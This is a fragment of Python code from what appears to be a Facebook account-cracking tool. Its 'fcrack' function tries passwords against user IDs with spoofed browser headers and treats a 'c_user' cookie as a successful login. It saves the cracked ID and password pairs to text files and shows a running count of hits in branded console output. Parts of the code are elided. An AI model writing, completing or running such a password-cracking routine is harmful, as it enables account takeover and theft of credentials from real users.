...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=O1TsZVafWaL-h5uwWSruKg4M; sb=O1TsZRrSOHy6W3ez-KQ1zErT; ps_l=0; ps_n=0; m_pixel_ratio=3; wd=360x688',
    'dpr': '3',
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Hasnain-OK] '+cid+' | '+ps+'\x1b[1;97m')
                open('Hasnain-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                open('Hasnain-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mADDICTOR-Hasnain\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
